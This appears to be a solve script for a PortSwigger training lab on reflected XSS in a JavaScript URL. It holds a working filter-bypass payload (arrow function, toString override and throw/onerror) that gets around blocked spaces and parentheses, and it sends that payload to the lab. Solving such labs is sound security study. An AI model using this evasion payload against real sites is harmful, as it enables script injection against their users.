#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS in a JavaScript URL with some characters blocked
Spaces and () are blocked. Uses arrow function + toString override + throw/onerror chain.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 28: JavaScript URL with some characters blocked"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # The payload — arrow function + toString override + throw/onerror
    # Spaces and () are blocked
    # URL-decoded: '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
    exploit_url = (
        f"{lab}/post?postId=5"
        "&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27"
    )
    print(f"[+] Exploit URL:\n    {exploit_url}")
    print("\n[*] Visit the URL and click the 'Back to Blog' link to trigger alert")

    # Verify the page loads (not blocked by WAF)
    r = s.get(exploit_url)
    if r.status_code == 200:
        print("[+] Page loads successfully (payload not blocked)")
    else:
        print(f"[-] Server returned {r.status_code} — payload may contain blocked characters")

    # Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Click 'Back to Blog' in the browser to trigger the JavaScript URL")


if __name__ == "__main__":
    main()
